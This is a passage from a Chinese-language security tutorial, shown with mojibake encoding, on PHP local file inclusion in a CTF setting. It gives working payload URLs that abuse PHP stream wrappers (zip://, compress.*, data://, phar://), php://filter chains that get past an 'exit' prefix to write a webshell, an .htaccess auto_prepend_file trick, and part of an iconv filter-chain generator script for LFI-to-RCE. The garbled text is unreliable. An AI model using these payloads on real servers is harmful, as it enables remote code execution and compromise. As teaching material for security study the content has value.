<li><p><code>zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</code>ï¼ˆ#ç¼–ç ä¸º%23ï¼‰</p>
<p>å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ï¼Œå¹¶ä¸Šä¼ </p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBj" alt="å›¾ç‰‡æè¿°"></p>
</li>
<li><p><code>compress.bzip2://file.bz2</code></p>
<p>å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBt" alt="å›¾ç‰‡æè¿°"></p>
</li>
<li><p><code>compress.zlib://file.gz</code></p>
<p>å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBu" alt="å›¾ç‰‡æè¿°"></p>
</li>
</ol>
</li>
<li><p><strong>å‚è€ƒ</strong>ï¼š<a href="https://link.segmentfault.com/?enc=w0uak4RdRJUStEHdEK6h4w==.xhWZ9YsBZncXK/YcM6ZNJ5Jey44TQSRRDG2PDhW+VOCrc/wcHb6xJoP7Fff88EcMBe0t2zuSqAZeW77CzMA4ZQ==">http://php.net/manual/zh/wrappers.compression.php</a></p>
</li>
</ul>
<h3 id="data-åè®®"><a href="#data-åè®®" class="headerlink" title="data:// åè®®"></a><code>data://</code> åè®®</h3><ul>
<li><p><strong>æ¡ä»¶</strong>ï¼š</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>ä½œç”¨</strong>ï¼šè‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p>
</li>
<li><p><strong>ç”¨æ³•</strong>ï¼š</p>
<pre><code class="highlight dts"><span class="symbol">data:</span><span class="comment">//text/plain,</span>
<span class="symbol">data:</span><span class="comment">//text/plain;base64,</span></code></pre>
</li>
<li><p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<ol>
<li><p><code>data://text/plain,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBB" alt="å›¾ç‰‡æè¿°"></p>
</li>
<li><p><code>data://text/plain;base64,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBD" alt="å›¾ç‰‡æè¿°"></p>
</li>
</ol>
</li>
</ul>
<h3 id="http-https-åè®®"><a href="#http-https-åè®®" class="headerlink" title="http:// &amp; https:// åè®®"></a><code>http:// &amp; https://</code> åè®®</h3><ul>
<li><p><strong>æ¡ä»¶</strong>ï¼š</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>ä½œç”¨</strong>ï¼šå¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ <code>HTTP 1.0</code> çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«ã€‚</p>
</li>
<li><p><strong>ç”¨æ³•</strong>ï¼š</p>
<pre><code class="highlight dts"><span class="symbol">http:</span><span class="comment">//example.com</span>
<span class="symbol">http:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">http:</span><span class="comment">//user:password@example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">https:</span><span class="comment">//user:password@example.com</span></code></pre>
</li>
<li><p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBP" alt="å›¾ç‰‡æè¿°"></p>
</li>
</ul>
<h3 id="phar-åè®®"><a href="#phar-åè®®" class="headerlink" title="phar:// åè®®"></a><code>phar://</code> åè®®</h3><p><code>phar://</code>åè®®ä¸<code>zip://</code>ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ï¼Œåœ¨è¿™é‡Œåªç»™å‡ºä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBX" alt="å›¾ç‰‡æè¿°"></p>
<p>å¦å¤–åœ¨ Black Hat 2018 å¤§ä¼šä¸Šï¼Œç ”ç©¶äººå‘˜å…¬å¸ƒäº†ä¸€æ¬¾é’ˆå¯¹PHPåº”ç”¨ç¨‹åºçš„å…¨æ–°æ”»å‡»æŠ€æœ¯ï¼š<strong>phar:&#x2F;&#x2F;åè®®å¯¹è±¡æ³¨å…¥æŠ€æœ¯</strong>ã€‚</p>
<p>å› ä¸ºè¯¥åˆ©ç”¨ç‚¹éœ€è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶æ‰èƒ½åˆ©ç”¨ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œé‡Œé¢çš„demoä¹Ÿéå¸¸è¯¦ç»†ï¼Œç•™ä½œä»¥åä¸“é—¨ç ”ç©¶ä¸€ä¸‹ã€‚</p>
<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="filteré“¾ç»•è¿‡"><a href="#filteré“¾ç»•è¿‡" class="headerlink" title="filteré“¾ç»•è¿‡"></a>filteré“¾ç»•è¿‡</h3><p>æ„é€ ä¸€ä¸²å­—ç¬¦åˆ©ç”¨è¿‡æ»¤å™¨çš„æ€§è´¨æ„é€ (åœ¨å·²çŸ¥æ–‡ä»¶å‰æ„é€ å‘½ä»¤æ‰§è¡Œ)æˆ–ç ´åå­—ç¬¦(exit)</p>
<h4 id="base64ç‰¹è´¨"><a href="#base64ç‰¹è´¨" class="headerlink" title="base64ç‰¹è´¨"></a>base64ç‰¹è´¨</h4><p>åœ¨base64_decodeä¸­ä¼šå°†ä¸åœ¨A-Za-z0-9+&#x2F;&#x3D;çš„å­—ç¬¦å…¨éƒ½å»æ‰ï¼Œäºæ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ç»•è¿‡exit</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161257630.png" alt="image-20250326161257630"></p>
<p>ä¹ä¸€çœ¼ï¼Œä½ è¿™ä¸å¯¹å•Šã€‚ã€‚ã€‚ã€‚è¿™æ˜¯å› ä¸ºbase64åœ¨è§£ç çš„æ—¶å€™æ˜¯å°†4ä¸ªå­—èŠ‚è½¬åŒ–ä¸º3ä¸ªå­—èŠ‚ï¼Œåˆå› ä¸ºæ­»äº¡ä»£ç åªæœ‰phpexitå‚ä¸äº†è§£ç ï¼Œæ‰€ä»¥è¡¥ä¸Šä¸€ä½å°±å¯ä»¥å®Œå…¨è½¬åŒ–ï¼Œè§£ç çš„æ—¶å€™æœ‰æ•ˆå­—ç¬¦ä¸€å®šè¦æ˜¯4çš„å€æ•°ï¼Œä¸ç„¶å°±ä¼šè§£ç é”™è¯¯ï¼ŒåŸå› å°±æ˜¯æœªè¡¥è¶³çš„å­—ç¬¦æœ¬è´¨ä¸Šæ˜¯ç”¨&#x3D;è¡¥è¶³çš„</p>
<p>è€Œåœ¨è§£ç æ—¶&#x3D;åè¿˜æœ‰å­—ç¬¦æ˜æ˜¾æ˜¯é”™è¯¯çš„ï¼Œæ‰€ä»¥å°±ä¼šæ³¨å…¥å¤±è´¥</p>
<h4 id="rot13-ç¼–ç ç»•è¿‡"><a href="#rot13-ç¼–ç ç»•è¿‡" class="headerlink" title="rot13 ç¼–ç ç»•è¿‡"></a><strong>rot13 ç¼–ç ç»•è¿‡</strong></h4><p>åŸç†å’Œbase64ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥è½¬ç åˆ†è§£æ­»äº¡ä»£ç ï¼›è¿™é‡Œä¸å†å¤šè¯´ï¼›ç›´æ¥çœ‹å¦‚ä¸‹å®éªŒç»“æœå³å¯ï¼›</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161910851.png" alt="image-20250326161910851"></p>
<p>åªæ˜¯è¿™ç§æ–¹æ³•æœ‰ç‚¹å°´å°¬çš„æ˜¯ï¼›å› ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹ä¹‹ä¸­å‰é¢çš„<code>&lt;?</code>å¹¶æ²¡æœ‰åˆ†è§£æ‰ï¼Œè¿™æ—¶ï¼Œå¦‚æœæœåŠ¡å™¨å¼€å¯äº†çŸ­æ ‡ç­¾(short_open_tag)ï¼Œé‚£ä¹ˆå°±ä¼šè¢«è§£æï¼Œæ‰€ä»¥æ‰€ä»¥åé¢çš„ä»£ç å°±ä¼šé”™è¯¯ï¼›ä¹Ÿå°±å¤±å»äº†ä½œç”¨ï¼›</p>
<h4 id="htaccessçš„é¢„åŒ…å«åˆ©ç”¨"><a href="#htaccessçš„é¢„åŒ…å«åˆ©ç”¨" class="headerlink" title=".htaccessçš„é¢„åŒ…å«åˆ©ç”¨"></a><strong><code>.htaccess</code>çš„é¢„åŒ…å«åˆ©ç”¨</strong></h4><p>åˆ©ç”¨ <code>.htaccess</code>çš„é¢„åŒ…å«æ–‡ä»¶çš„åŠŸèƒ½æ¥è¿›è¡Œæ”»ç ´ï¼›è‡ªå®šä¹‰åŒ…å«æˆ‘ä»¬çš„flagæ–‡ä»¶ã€‚</p>
<pre><code class="highlight plaintext">$filename=php://filter/write=string.strip_tags/resource=.htaccess

$content=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php</code></pre>

<p>åŒæ—¶ä¼ å…¥å¦‚ä¸Šçš„ä»£ç ï¼Œé¦–å…ˆæ¥è§£é‡Š$filenameçš„ä»£ç ï¼Œè¿™é‡Œå¼•ç”¨äº†<code>string.strip_tags</code>è¿‡æ»¤å™¨ï¼Œå¯ä»¥è¿‡æ»¤.htaccesså†…å®¹çš„htmlæ ‡ç­¾ï¼Œè‡ªç„¶ä¹Ÿå°±æ¶ˆé™¤äº†æ­»äº¡ä»£ç ï¼›$contentå³é—­åˆæ­»äº¡ä»£ç ä½¿å…¶å®Œå…¨æ¶ˆé™¤ï¼Œå¹¶ä¸”å†™å…¥è‡ªå®šä¹‰åŒ…å«æ–‡ä»¶ï¼›å®éªŒç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162057074.png" alt="image-20250326162057074"></p>
<p>ä½†æ˜¯è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯å…·æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“flagæ–‡ä»¶çš„ä½ç½®ï¼Œå’Œæ–‡ä»¶çš„åå­—ï¼Œä¸€èˆ¬çš„æ¯”èµ›ä¸­å¯ä»¥ç›²çŒœ <code>flag.php flag /flag /flag.php</code> ç­‰ç­‰ï¼›å¦å¤–è¿˜æœ‰ä¸ªå¾ˆå¤§çš„é—®é¢˜æ˜¯ï¼Œ<code>string.strip_tags</code>è¿‡æ»¤å™¨åªæ˜¯å¯ä»¥åœ¨php5çš„ç¯å¢ƒä¸‹é¡ºåˆ©çš„ä½¿ç”¨ï¼Œå¦‚æœé¢˜ç›®ç¯å¢ƒæ˜¯åœ¨php7.3.0ä»¥ä¸Šçš„ç¯å¢ƒä¸‹ï¼Œåˆ™ä¼šå‘ç”Ÿæ®µé”™è¯¯ã€‚å¯¼è‡´å†™ä¸è¿›å»ï¼›æ ¹æœ¬æ¥è¯´æ˜¯php7.3.0ä¸­åºŸå¼ƒäº†string.strip_tagsè¿™ä¸ªè¿‡æ»¤å™¨ï¼›</p>
<h4 id="è“„æ„ä¹±åº"><a href="#è“„æ„ä¹±åº" class="headerlink" title="è“„æ„ä¹±åº"></a>è“„æ„ä¹±åº</h4><p>ä»‹ç»UCS-2LEå’ŒUCS-2BEä¸¤ç§è¿‡æ»¤å™¨çš„ç»„åˆä»¥åŠUCS-4LEå’ŒUCS-2BEä¸¤ç§è¿‡æ»¤å™¨çš„ç»„åˆ</p>
<p>å…¶ä¸­2xEéƒ½æ˜¯è¿›è¡Œä¸¤ä½ä¸€åè½¬ï¼Œ4xEè¿›è¡Œå››ä½ä¸€åè½¬ï¼Œç›®çš„å…¶å®å°±æ˜¯ç ´åå‰é¢æ­»äº¡exitçš„é¡ºåºæ¥è¾¾åˆ°è®©phpæ— æ³•è¯†åˆ«çš„æ•ˆæœ</p>
<h4 id="è¿‡æ»¤å™¨ç¼–ç ç»„åˆæ‹³"><a href="#è¿‡æ»¤å™¨ç¼–ç ç»„åˆæ‹³" class="headerlink" title="è¿‡æ»¤å™¨ç¼–ç ç»„åˆæ‹³"></a><strong>è¿‡æ»¤å™¨ç¼–ç ç»„åˆæ‹³</strong></h4><p>è¿‡æ»¤å™¨ç»„åˆæ‹³ï¼Œå…¶å®æ•…åæ€æ„ï¼Œå°±æ˜¯åˆ©ç”¨è¿‡æ»¤å™¨åµŒå¥—è¿‡æ»¤å™¨è¿›è¡Œè¿‡æ»¤ï¼Œä»¥æ­¤è¾¾åˆ°ä»£ç çš„å±‚å±‚æ›´è¿­ï¼Œä»è€Œæœ€åå†™å…¥æˆ‘ä»¬æœŸæœ›çš„ä»£ç ï¼›</p>
<p><strong>å…ˆæ¥ä¸€ç§ï¼š</strong></p>
<pre><code class="highlight plaintext">$filename=&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;
$content=&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</code></pre>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ©ç”¨string.strip_tagså¯ä»¥è¿‡æ»¤æ‰htmlæ ‡ç­¾ï¼Œå°†<strong>æ ‡ç­¾å†…çš„æ‰€æœ‰å†…å®¹è¿›è¡Œåˆ å»</strong>ï¼Œç„¶åå†è¿›è¡Œbase64è§£ç ï¼ŒæˆåŠŸå†™å…¥shellï¼›</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162042101.png" alt="image-20250326162042101"></p>
<p>ä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰ä¸€å®šçš„å±€é™æ€§ä¹Ÿè¿˜æ˜¯å› ä¸ºstring.strip_tagsåœ¨php7.3.0ä»¥ä¸Šçš„ç¯å¢ƒä¸‹ä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼Œä»è€Œå¯¼è‡´æ— æ³•å†™å…¥ï¼Œä½†æ˜¯åœ¨php5çš„ç¯å¢ƒä¸‹åˆ™ä¸å—æ­¤å½±å“ï¼›</p>
<p><strong>å†æ¥å¦å¤–ä¸€ç§</strong></p>
<p>å¦‚æœé¢˜ç›®çš„ç¯å¢ƒæ˜¯php7çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆè¯¥å¦‚ä½•ï¼Ÿè¿™é‡Œå—ä¸€ä¸ªé¢˜ç›®çš„å¯å‘ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨è¿›è¡ŒåµŒå¥—æ¥åšï¼›ç»„åˆæ‹³ï¼›è¿™é‡Œä¸‰ä¸ªè¿‡æ»¤å™¨å åŠ ä¹‹åå…ˆè¿›è¡Œå‹ç¼©ï¼Œç„¶åè½¬å°å†™ï¼Œæœ€åè§£å‹ï¼Œä¼šå¯¼è‡´éƒ¨åˆ†æ­»äº¡ä»£ç é”™è¯¯ï¼›åˆ™å¯ä»¥å†™å…¥shellï¼›</p>
<pre><code class="highlight plaintext">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php
$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php</code></pre>

<p>å¦‚æ­¤ä¾¿å¯ä»¥å†™å…¥ï¼›å…¶åŸç†ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åˆ©ç”¨è¿‡æ»¤å™¨åµŒå¥—è®©æ­»äº¡ä»£ç åœ¨å„ç§å˜æ¢ä¹‹é—´è¿›è¡Œåˆ†è§£æ‰°ä¹±ï¼Œç„¶åå†æ¬¡å†™å…¥æœ¨é©¬ï¼›</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162048585.png" alt="image-20250326162048585"></p>
<p>è¿™é‡Œéå¸¸å·§åˆçš„æ˜¯å†…å®¹ç»è¿‡å‹ç¼©è½¬å°å†™ç„¶åè§£å‹ä¹‹åï¼Œæˆ‘ä»¬çš„ç›®çš„ä»£ç å¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¹Ÿä¸ºå†™å…¥æœ¨é©¬å¥ å®šäº†åŸºç¡€ï¼›</p>
<h4 id="æ— ä¸­ç”Ÿæœ‰ä¹‹inconv"><a href="#æ— ä¸­ç”Ÿæœ‰ä¹‹inconv" class="headerlink" title="æ— ä¸­ç”Ÿæœ‰ä¹‹inconv"></a>æ— ä¸­ç”Ÿæœ‰ä¹‹inconv</h4><p>å‘ƒå‘ƒï¼Œåˆé•¿åˆè‡­çš„è„šæœ¬ç¯èŠ‚ï¼Œåªè®²ä¸€ä¸‹åŸç†å§ï¼Œè„šæœ¬è¿˜æ˜¯è¦ç­‰æˆ‘çš„XSSä¸‰å…„å¼Ÿå­¦å®Œæ‰ä¼šå›å¤´è¡¥å®Œä¸€ä¸‹ã€‚ã€‚</p>
<p>ä¸»åŒ…è®²çš„ä¸å¥½ä¹Ÿå¯ä»¥å‚è€ƒpç¥çš„åšå®¢<a href="https://err0r233.github.io/posts/28510.html">çœŸæ­£çš„from LFI to RCEâ€”â€”CVE-2024-2961 | Err0r233</a></p>
<p>ä»ä¸Šé¢å·²ç»çŸ¥é“æˆ‘ä»¬å¯ä»¥åˆ©ç”¨base64è§£ç çš„ç‰¹è´¨å’Œstrip_tagsæ¥åˆ é™¤æ‰ä¸€äº›è¿‡æ»¤</p>
<p>é‚£æœ‰çš„äººä¼šè¯´äº†ï¼Œä¸»åŒ…ä¸»åŒ…ä½ çš„æ··æ·†ç¡®å®å¾ˆå¼ºï¼Œä½†æ˜¯å¦‚ä½•ä»–çš„æ³¨å…¥ç‚¹å¹²å‡€çš„ä¸å¾—äº†å‘¢</p>
<pre><code class="highlight php"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
<span class="keyword">include</span>(<span class="variable">$a</span>);</code></pre>

<p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦è‡ªè¡Œæ„é€ ä¸€äº›å±é™©ä»£ç ï¼ŒåŒæ—¶åˆ©ç”¨base64å°†å…¶å…ˆç¼–ç é˜²æ­¢è¯¸å¦‚<code>&lt;?;&gt;</code>è¿™äº›å­—ç¬¦åœ¨è§£ç æ—¶è¢«è¿‡æ»¤æ‰</p>
<p>æ‰€ä»¥è¦ä»‹ç»ä¸€äº›ç¥å¥‡çš„è¿‡æ»¤å™¨:</p>
<ul>
<li>CSISO2022KR</li>
</ul>
<p>å°†å­—ç¬¦é›†ä»æˆ‘ä»¬å¸¸ç”¨çš„<code>UTF-8</code>è½¬æ¢ä¸º<code>CSISO2022KR</code></p>
<pre><code class="highlight php">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,aaaaaaaaaaaaaa</span>
è½¬æ¢ç»“æœï¼š
<span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;%1B%24%29Caaaaaaaaaaaaaa&quot;</span>

å…¶å®æ˜¯ <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;ä¸å¯è§å­—ç¬¦$)Caaaaaaaaaaaaaa&quot;</span></code></pre>

<p>æ­¤æ—¶å¯ä»¥çœ‹åˆ°æˆåŠŸæ„é€ äº†ä¸€ä¸ªå­—ç¬¦C</p>
<p>è¾¾åˆ°äº†æ— ä¸­ç”Ÿæœ‰çš„æ•ˆæœäº†</p>
<p>è€Œé€šè¿‡å‡ æ¬¡å·§å¦™çš„æ„é€ ï¼Œå°±å¯ä»¥å‡ºæ•´å¼ base64è¡¨ï¼Œè¿™é‡Œç›´æ¥è´´pç¥æ“å¥½çš„è„šæœ¬</p>
<pre><code class="highlight python"><span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> argparse
<span class="keyword">import</span> base64
<span class="keyword">import</span> re

<span class="comment"># - Useful infos -</span>
<span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span>
<span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span>
<span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span>

<span class="comment"># No need to guess a valid filename anymore</span>
file_to_use = <span class="string">&quot;php://temp&quot;</span>

conversions = &#123;
    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,
    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,
    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,
    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,
    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,
    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,
    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,
    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,
    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,
    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,
    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,
    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,
    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,
    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,
    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,
    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,
    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,
    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,
    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,
    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,
    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,
    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,
    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,
    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,
    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,
    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,
    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,
    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,
    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,
    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,
    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,
